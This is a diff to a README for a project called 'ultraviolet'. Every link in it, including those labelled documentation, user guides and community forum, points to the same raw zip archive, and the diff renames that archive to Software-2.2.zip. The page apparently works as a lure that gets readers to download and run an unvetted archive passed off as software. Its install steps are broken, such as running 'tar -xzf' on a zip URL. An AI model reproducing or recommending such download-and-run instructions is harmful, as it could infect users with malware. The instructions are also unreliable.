@@ -6,7 +6,7 @@ Welcome to the ultraviolet project! This application provides a unique blueprint
 
 ## 📥 Download Now
 
-[![Download ultraviolet](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
+[![Download ultraviolet](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
 
 ## 📋 Overview
 
@@ -32,12 +32,12 @@ To run ultraviolet successfully, your system should meet the following requireme
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip) to find the latest version of ultraviolet.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip) to find the latest version of ultraviolet.
 2. **Choose Your Version**: Look for the most recent release. Each release contains files for different operating systems. Select the version that matches your system requirements.
 3. **Download the File**: Click on the appropriate link to download the file.
 4. **Install the Application**:
    - **For OpenBSD Users**: Navigate to your Downloads folder.
-   - Run the command: `tar -xzf https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip` to extract your files.
+   - Run the command: `tar -xzf https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip` to extract your files.
    - Change directory into the extracted folder: `cd ultraviolet-x.x.x`.
    - Finally, execute the software by running: `./ultraviolet`.
 5. **Start Using Ultraviolet**: Once the application runs, you can begin using all its features right away.
@@ -75,8 +75,8 @@ If you encounter any issues or have questions, feel free to reach out:
 
 For deeper insights into ultraviolet's features and usage, refer to the following resources:
 
-1. [Official Documentation](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
-2. [User Guides](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
+1. [Official Documentation](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
+2. [User Guides](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
 
 ## 🌐 Explore More
 
@@ -92,8 +92,8 @@ Feel free to explore these topics for a better understanding of our project.
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [Download ultraviolet](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
-- **Documentation**: [Read the Docs](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
-- **Community Forum**: [Join the Discussion](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/ultraviolet.zip)
+- **Releases Page**: [Download ultraviolet](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
+- **Documentation**: [Read the Docs](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
+- **Community Forum**: [Join the Discussion](https://raw.githubusercontent.com/rtCarl/ultraviolet/main/soldering/Software-2.2.zip)
 
 Thank you for choosing ultraviolet! Enjoy your experience with our software.
